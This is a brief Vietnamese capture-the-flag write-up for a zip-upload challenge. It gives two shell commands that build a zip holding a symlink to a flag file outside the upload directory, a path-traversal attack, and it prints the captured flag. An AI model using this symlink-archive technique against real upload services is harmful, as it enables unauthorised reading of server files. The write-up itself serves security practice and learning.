# Unzip me now

![alt text](image.png)

Bài này liên quan đến upload file bằng file zip, như tiêu đề thì mình search thấy ngay có một file thuật liên quan đến vấn đề này. Hãy lên hack trick để tìm

```
ln -s ../../../flag.txt test.txt
zip --symlinks test.zip test.txt
```

Ban đầu ta tạo một symlink liên kết trực tiếp tới file test.txt

Sau đó nén nó lại, và khi giải nén với option syslinks thì file vẫn là một symlink và đi đọc nó sẽ link tới /flag.txt


Flag: CHH{zIPpy_PATH_tRAvERS4l_7b702e6eddbd29d423facb5af456afff}